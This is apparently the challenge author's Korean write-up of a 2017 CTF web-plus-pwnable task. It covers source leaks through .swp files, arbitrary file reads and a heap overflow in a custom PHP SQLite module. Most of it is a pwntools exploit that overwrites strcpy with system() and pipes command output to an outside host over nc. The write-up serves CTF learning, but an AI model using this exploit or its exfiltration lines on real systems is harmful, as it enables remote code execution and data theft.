# WhiteHat League 1 - Demon CTF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
White Write-Up - 출제자 풀이
-----------------------------------

## Introduce
* Author : 이진우 ([unknown84](http://unknown84.tistory.com))
* Field  : Web Hacking + Pwnable
* E-Mail : unknown84@naver.com
* Date   : 2017-09-13

## Intention
* 전체적인 컨셉으로는 실제 **PHP 모듈**에서 발생하는 취약점을 기본으로 함.
* 플래그 형식은 **DEMON{...}**

## Solve
* [challenge url](http:// NULL)

### 1. Functions Analyse
> 1. 메인 페이지의 백그라운드 사진이 있는 /test/ 경로에 들어가면 directory listing이 되고 안의 파일을 읽어보면 개발자는 vi를 사용하고 C언어를 좋아한다고 나와있다.
-  test_1.php, test_2.php, test_3.php을 들어가보면 input error가 출력된다.
-  .filename.swp를 통해 접근하면 위 파일들의 소스를 확인할 수 있다.
   ![소스1](https://github.com/unknown84/tmp_img/blob/master/Picture1.png?raw=true)
> 2. read file
- test_2.php에서 원하는 파일을 읽을 수 있다.
  ![소스2](https://github.com/unknown84/tmp_img/blob/master/Picture2.png?raw=true)
- db_backup.php의 코드를 확인하면 bcakup_db_getuserinfo라는 수상한 함수가 있다.
  ![소스3](https://github.com/unknown84/tmp_img/raw/master/Picture3.png)
- test_2.php => /proc/self/maps 를 통해 로드된 모듈을 확인 및 다운로드

> 3. 모듈 분석
- ida로 bcakup_db.so를 분석해보면 링크드리스트로 회원 리스트를 만들고 uid,upw,uinfo 크기별로 malloc해서 할당해준다.
  uid가 같을 경우 upw와 uinfo를 길이값 검증을 하지 않고 복사를 한다.
  ![소스4](https://github.com/unknown84/tmp_img/raw/master/Picture4.png)
  ![소스5](https://github.com/unknown84/tmp_img/raw/master/Picture5.png)
  user
  uid
  upw
  uinfo
  user
  uid
  upw
  uinfo
  위와 같이 메모리를 할당시키고 upw에서 overflow를 발생시켜 user 정보를 덮게 되면 원하는 주소에 값을 쓸 수 있다.
  릭은 /test/test_2.php 에서 /proc/self/maps를 읽으면 된다.
```{.python}
import sqlite3
import os
from pwn import *

flag = False
if os.path.isfile('exp.db'):
	flag = True
con = sqlite3.connect('exp.db')
cursor = con.cursor()

c_q = 'CREATE TABLE hello (uid text, upw text, uinfo text);'
i_q = "INSERT INTO hello(uid,upw,uinfo) values ('%s','%s','%s');"
def create():
	cursor.execute(c_q)
	con.commit()

def make(uid,upw,uinfo):
	print uinfo.encode('hex')
	cursor.execute(i_q % (uid,upw,uinfo))
	con.commit()


if not flag:
	create()

for i in range(520):
	t = '%s%i' % ('A'*28,i)
	make(t,t,t)

t = 'j'*32
k = 'k'*32
k = 'ls -al /|nc cutejinu.xyz 4949  ;'
make(t,t,t)
#make(t*4,t,t)
make(k,k,k)
import urllib2
g = urllib2.urlopen('http://172.16.114.158/test/test_2.php?jfilej=/proc/self/maps').read()
#g = urllib2.urlopen('http://192.168.0.116/test/test_2.php?jfilej=/proc/self/maps').read()
e = ELF('libc-2.23.so')
leak_libc = int(g.split('libc-')[0].split('\n')[-1].split('-')[0],16)
print hex(leak_libc)
st = leak_libc+e.symbols['system']#-0x1000

fakeuid = p64(leak_libc + list(e.search('/bin/sh'))[0])
passsword = p64(int(g.split('bcakup_db')[0].split('\n')[-1].split('-')[0],16)+0x0000000000202020)
print '0x%x 0x%x 0x%x ' % (u64(fakeuid), u64(passsword), st)
# 0000000000202020 off_202020      dq offset strcpy        ; DATA XREF: _strcpyr
dat = 'A'*16 + fakeuid + passsword
dat = dat
print dat
ar = []
for i,tt in enumerate(dat):
	if tt == '\x00':
		ar.append(i)
print ar

make(t,t,t+dat.replace('\x00','A'))
#print (t+dat.replace('\x00','A')).encode('hex')
for tt in ar[::-1]:
	#print (t+dat[:tt].replace('\x00','A')).encode('hex')
	make(t,t,t+dat[:tt].replace('\x00','A'))
make('/bin/sh',p64(st)[:-2],'ls -al|nc cutejinu.xyz 4949;')
make('ls -al|nc cutejinu.xyz 4949;','ls -al|nc cutejinu.xyz 4949;','ls -al|nc cutejinu.xyz 4949;')

con.close()
```

> 4. 위의 코드로 생성된 exp.db를 DB 확인 부분에 업로드하면 / 경로에 있는 파일 리스트를 확인할 수 있다.
>    ![exp6](https://github.com/unknown84/tmp_img/raw/master/Picture6.png)
>    ![exp7](https://github.com/unknown84/tmp_img/raw/master/Picture7.png)

> 5.  Other Exploit
- sqlite로 어찌어찌하는듯
  ~~근데 나는 모르겠다~~

# 끝